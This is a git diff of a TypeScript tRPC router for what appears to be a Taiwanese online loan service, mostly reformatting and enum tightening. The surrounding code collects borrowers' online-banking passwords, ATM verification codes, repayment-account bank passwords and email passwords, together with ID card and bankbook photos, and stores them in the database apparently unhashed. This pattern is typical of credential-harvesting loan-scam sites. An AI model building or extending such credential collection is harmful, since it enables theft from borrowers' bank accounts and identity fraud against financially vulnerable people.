@@ -1,12 +1,12 @@
+// routers.ts 或 appRouter.ts
 import { z } from "zod";
 import { TRPCError } from "@trpc/server";
 import { COOKIE_NAME } from "@shared/const";
 import { getSessionCookieOptions } from "./_core/cookies";
 import { systemRouter } from "./_core/systemRouter";
 import { sdk } from "./_core/sdk";
-import { publicProcedure, protectedProcedure, router } from "./_core/trpc";
+import { router, publicProcedure, protectedProcedure, adminProcedure } from "./_core/trpc";
 import { notifyOwner } from "./_core/notification";
-// storage import removed - images stored as base64 in database
 import type { InsertIdDocument } from "../drizzle/schema";
 import bcrypt from "bcryptjs";
 import { notifyNewUser, notifyProfileUpdated, notifyDocumentUploaded, notifyLoanApplication } from "./email";
@@ -39,19 +39,14 @@ import {
   deleteUser,
 } from "./db";
 
-// Admin guard middleware
-const adminProcedure = protectedProcedure.use(({ ctx, next }) => {
-  if (ctx.user.role !== "admin") {
-    throw new TRPCError({ code: "FORBIDDEN", message: "需要管理員權限" });
-  }
-  return next({ ctx });
-});
-
 export const appRouter = router({
   system: systemRouter,
 
   auth: router({
-    me: publicProcedure.query((opts) => opts.ctx.user),
+    // ✅ me 現在安全了 - 沒有 session 就回傳 null
+    me: publicProcedure.query(({ ctx }) => {
+      return ctx.user || null;
+    }),
 
     register: publicProcedure
       .input(z.object({
@@ -65,21 +60,37 @@ export const appRouter = router({
         if (existing) {
           throw new TRPCError({ code: "CONFLICT", message: "此手機號碼已被註冊" });
         }
+        
         // 雜湊密碼
         const passwordHash = await bcrypt.hash(input.password, 10);
+        
         // 建立用戶
         const user = await createUserWithPhone(input.phone, passwordHash, input.name, 'limitdai');
         if (!user) throw new TRPCError({ code: "INTERNAL_SERVER_ERROR", message: "建立帳號失敗" });
+        
         // 建立 session
         const token = await sdk.createSessionToken(user.openId, { name: user.name ?? "" });
         const cookieOptions = getSessionCookieOptions(ctx.req);
-                ctx.res.cookie(COOKIE_NAME, token, { ...cookieOptions, maxAge: 365 * 24 * 60 * 60 * 1000 });
+        ctx.res.cookie(COOKIE_NAME, token, { ...cookieOptions, maxAge: 365 * 24 * 60 * 60 * 1000 });
+        
         // 發送 Email 通知管理員
         try {
           await notifyNewUser(input.phone);
-        } catch (e) { console.warn('[Email] notifyNewUser failed:', e); }
-        return { success: true, user: { id: user.id, phone: user.phone, name: user.name, role: user.role } };
+        } catch (e) { 
+          console.warn('[Email] notifyNewUser failed:', e); 
+        }
+        
+        return { 
+          success: true, 
+          user: { 
+            id: user.id, 
+            phone: user.phone, 
+            name: user.name, 
+            role: user.role 
+          } 
+        };
       }),
+
     login: publicProcedure
       .input(z.object({
         phone: z.string().min(2).max(20),
@@ -91,32 +102,46 @@ export const appRouter = router({
         if (!input.isAdmin && !/^09\d{8}$/.test(input.phone)) {
           throw new TRPCError({ code: "BAD_REQUEST", message: "請輸入正確的台灣手機號碼（09 開頭，共 10 碼）" });
         }
+        
         const user = await getUserByPhone(input.phone);
         if (!user || !user.passwordHash) {
           throw new TRPCError({ code: "UNAUTHORIZED", message: "帳號或密碼錯誤" });
         }
+        
         const valid = await bcrypt.compare(input.password, user.passwordHash);
         if (!valid) {
           throw new TRPCError({ code: "UNAUTHORIZED", message: "手機號碼或密碼錯誤" });
         }
+        
         // 檢查帳號是否被凍結
         if (user.status === 'frozen') {
           throw new TRPCError({ code: "FORBIDDEN", message: "此帳號已被凍結，請聯繫客服" });
         }
+        
         // 記錄登入 IP
         const ip = (ctx.req.headers['x-forwarded-for'] as string)?.split(',')[0]?.trim() || ctx.req.socket?.remoteAddress || '';
         await updateUserLastLoginIp(user.id, ip);
+        
         // 建立 session
         const token = await sdk.createSessionToken(user.openId, { name: user.name ?? "" });
         const cookieOptions = getSessionCookieOptions(ctx.req);
         ctx.res.cookie(COOKIE_NAME, token, { ...cookieOptions, maxAge: 365 * 24 * 60 * 60 * 1000 });
-        return { success: true, user: { id: user.id, phone: user.phone, name: user.name, role: user.role } };
+        
+        return { 
+          success: true, 
+          user: { 
+            id: user.id, 
+            phone: user.phone, 
+            name: user.name, 
+            role: user.role 
+          } 
+        };
       }),
 
     logout: publicProcedure.mutation(({ ctx }) => {
       const cookieOptions = getSessionCookieOptions(ctx.req);
       ctx.res.clearCookie(COOKIE_NAME, { ...cookieOptions, maxAge: -1 });
-      return { success: true } as const;
+      return { success: true };
     }),
 
     changePassword: protectedProcedure
@@ -129,10 +154,12 @@ export const appRouter = router({
         if (!user || !user.passwordHash) {
           throw new TRPCError({ code: "BAD_REQUEST", message: "此帳號不支援密碼修改" });
         }
+        
         const valid = await bcrypt.compare(input.currentPassword, user.passwordHash);
         if (!valid) {
           throw new TRPCError({ code: "UNAUTHORIZED", message: "目前密碼不正確" });
         }
+        
         const newHash = await bcrypt.hash(input.newPassword, 10);
         await upsertUser({ openId: user.openId, passwordHash: newHash });
         return { success: true };
@@ -169,11 +196,15 @@ export const appRouter = router({
           emailPassword: input.emailPassword || null,
           profileCompleted: "complete",
         });
+        
         // 發送 Email 通知管理員
         try {
           const userObj = await getUserById(ctx.user.id);
           await notifyProfileUpdated(userObj?.phone ?? '', input.fullName);
-        } catch (e) { console.warn('[Email] notifyProfileUpdated failed:', e); }
+        } catch (e) { 
+          console.warn('[Email] notifyProfileUpdated failed:', e); 
+        }
+        
         return { success: true };
       }),
   }),
@@ -194,6 +225,7 @@ export const appRouter = router({
         const dataUrl = `data:${input.mimeType};base64,${input.base64}`;
         const existing = await getIdDocument(ctx.user.id);
         const updateData: InsertIdDocument = { userId: ctx.user.id };
+        
         if (input.side === "front") {
           updateData.frontImageKey = `db:${ctx.user.id}:front`;
           updateData.frontImageUrl = dataUrl;
@@ -209,9 +241,11 @@ export const appRouter = router({
             updateData.frontImageUrl = existing.frontImageUrl ?? "";
           }
         }
+        
         await createOrUpdateIdDocument(updateData);
         return { success: true, url: dataUrl };
       }),
+      
     uploadPassbook: protectedProcedure
       .input(z.object({
         base64: z.string(),
@@ -225,6 +259,7 @@ export const appRouter = router({
           passbookImageKey: `db:${ctx.user.id}:passbook`,
           passbookImageUrl: dataUrl,
         };
+        
         if (existing?.frontImageKey) {
           updateData.frontImageKey = existing.frontImageKey;
           updateData.frontImageUrl = existing.frontImageUrl ?? "";
@@ -233,6 +268,7 @@ export const appRouter = router({
           updateData.backImageKey = existing.backImageKey;
           updateData.backImageUrl = existing.backImageUrl ?? "";
         }
+        
         await createOrUpdateIdDocument(updateData);
         return { success: true, url: dataUrl };
       }),
@@ -257,6 +293,7 @@ export const appRouter = router({
           onlineBankPassword: input.onlineBankPassword ?? null,
           atmVerification: input.atmVerification ?? null,
         };
+        
         if (existing?.frontImageKey) {
           updateData.frontImageKey = existing.frontImageKey;
           updateData.frontImageUrl = existing.frontImageUrl ?? "";
@@ -269,6 +306,7 @@ export const appRouter = router({
           updateData.passbookImageKey = existing.passbookImageKey;
           updateData.passbookImageUrl = existing.passbookImageUrl ?? "";
         }
+        
         await createOrUpdateIdDocument(updateData);
         return { success: true };
       }),
@@ -293,6 +331,7 @@ export const appRouter = router({
           repaymentOnlineBankPassword: input.repaymentOnlineBankPassword ?? null,
           repaymentAtmVerification: input.repaymentAtmVerification ?? null,
         };
+        
         if (existing?.frontImageKey) {
           updateData.frontImageKey = existing.frontImageKey;
           updateData.frontImageUrl = existing.frontImageUrl ?? "";
@@ -305,6 +344,7 @@ export const appRouter = router({
           updateData.passbookImageKey = existing.passbookImageKey;
           updateData.passbookImageUrl = existing.passbookImageUrl ?? "";
         }
+        
         await createOrUpdateIdDocument(updateData);
         return { success: true };
       }),
@@ -337,14 +377,20 @@ export const appRouter = router({
         try {
           const userObj = await getUserById(ctx.user.id);
           await notifyLoanApplication(userObj?.phone ?? '', Number(input.loanAmount), input.purpose);
-        } catch (e) { console.warn('[Email] notify failed:', e); }
+        } catch (e) { 
+          console.warn('[Email] notify failed:', e); 
+        }
+        
         // Manus 通知管理員
         try {
           await notifyOwner({
             title: "新借款申請",
             content: `用戶 ${userObj?.phone} 申請借款 ${input.loanAmount} 元，用途：${input.purpose}`,
           });
-        } catch (e) { console.warn('[Manus] notifyOwner failed:', e); }
+        } catch (e) { 
+          console.warn('[Manus] notifyOwner failed:', e); 
+        }
+        
         return { success: true };
       }),
 
@@ -428,10 +474,10 @@ export const appRouter = router({
       updateStatus: adminProcedure
         .input(z.object({
           loanId: z.number(),
-          status: z.string(),
+          status: z.enum(["待審核", "審核中", "已核准", "撥款中", "還款中", "已結清", "已拒絕"]),
         }))
-        .mutation(async ({ input }) => {
-          await updateLoanApplicationStatus(input.loanId, input.status);
+        .mutation(async ({ ctx, input }) => {
+          await updateLoanApplicationStatus(input.loanId, input.status, ctx.user.id);
           return { success: true };
         }),
 
@@ -454,7 +500,7 @@ export const appRouter = router({
       updateStatus: adminProcedure
         .input(z.object({
           repaymentId: z.number(),
-          status: z.enum(["pending", "completed", "overdue"]),
+          status: z.enum(["pending", "paid", "overdue", "partial"]),
         }))
         .mutation(async ({ input }) => {
           await updateRepayment(input.repaymentId, { status: input.status });
@@ -478,9 +524,11 @@ export const appRouter = router({
           if (existing) {
             throw new TRPCError({ code: "CONFLICT", message: "此手機號碼已被註冊" });
           }
+          
           const passwordHash = await bcrypt.hash(input.password, 10);
           const user = await createUserWithPhone(input.phone, passwordHash, input.name, 'limitdai');
           if (!user) throw new TRPCError({ code: "INTERNAL_SERVER_ERROR", message: "建立帳號失敗" });
+          
           await upsertUser({ id: user.id, role: "admin" });
           return { success: true, user };
         }),
